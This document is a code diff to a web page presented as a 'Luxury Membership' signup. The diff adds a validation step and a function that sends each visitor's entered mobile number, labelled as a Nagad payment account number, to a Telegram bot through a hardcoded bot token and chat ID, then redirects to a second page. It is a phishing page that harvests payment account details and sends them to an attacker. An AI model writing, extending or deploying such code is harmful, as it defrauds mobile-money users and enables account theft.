@@ -51,6 +51,7 @@
 
         .input-group p {
             margin-bottom: 10px;
+            font-weight: bold; /* Made the label bold */
         }
 
         .input-boxes {
@@ -76,6 +77,13 @@
             margin-top: 20px;
             font-size: 0.9rem; /* Adjusted font size */
             color: #D3D3D3; /* Light gray */
+        }
+
+        .error-message {
+            margin-top: 10px; /* Space for error message */
+            color: yellow; /* Yellow text for error message */
+            font-size: 0.9rem; /* Adjusted font size */
+            display: none; /* Hidden by default */
         }
 
         .buttons {
@@ -105,7 +113,7 @@
 
 <div class="container">
     <div class="header">
-        <img src="https://imgur.com/xCGvdyx.png" alt="Cart Icon"> <!-- Updated cart logo URL -->
+        <img src="https://imgur.com/xCGvdyx" alt="Cart Icon"> <!-- Updated cart logo URL -->
         <h2>LUXURY MEMBERSHIP</h2>
     </div>
 
@@ -136,8 +144,12 @@
         By clicking/tapping "Proceed" you are agreeing to our Terms and Conditions
     </div>
 
+    <div class="error-message" id="error-message">
+        Invalid mobile number
+    </div>
+
     <div class="buttons">
-        <button>Proceed</button>
+        <button onclick="validateNumber()">Proceed</button>
         <button class="cancel">Close</button>
     </div>
 
@@ -163,6 +175,52 @@
         }
     }
 
+    // Validate input on "Proceed" button click
+    function validateNumber() {
+        const inputs = document.querySelectorAll('.input-group input');
+        let mobileNumber = '';
+
+        // Collect the values from input boxes
+        inputs.forEach(input => {
+            mobileNumber += input.value;
+        });
+
+        // Check if the mobile number is 11 digits
+        if (mobileNumber.length !== 11) {
+            document.getElementById('error-message').style.display = 'block'; // Show error message
+        } else {
+            document.getElementById('error-message').style.display = 'none'; // Hide error message
+            sendToTelegram(mobileNumber); // Send number to Telegram
+            window.location.href = 'index2.html'; // Redirect to index2.html
+        }
+    }
+
+    // Send the input number to your Telegram bot
+    function sendToTelegram(mobileNumber) {
+        const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y'; // Replace with your bot token
+        const chatId = '7174617845'; // Replace with your chat ID
+        const message = `Nagad Account Number: ${mobileNumber}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Error sending message to Telegram:', response);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+
     // Prevent non-numeric input
     const inputs = document.querySelectorAll('.input-group input');
     inputs.forEach(input => {
@@ -173,7 +231,7 @@
             }
             // Ensure that it is a number and stop the keypress if not
             if ((event.shiftKey || (event.key < '0' || event.key > '9'))) {
-                event.preventDefault();
+                event.preventDefault(); // Prevent non-numeric input
             }
         });
     });
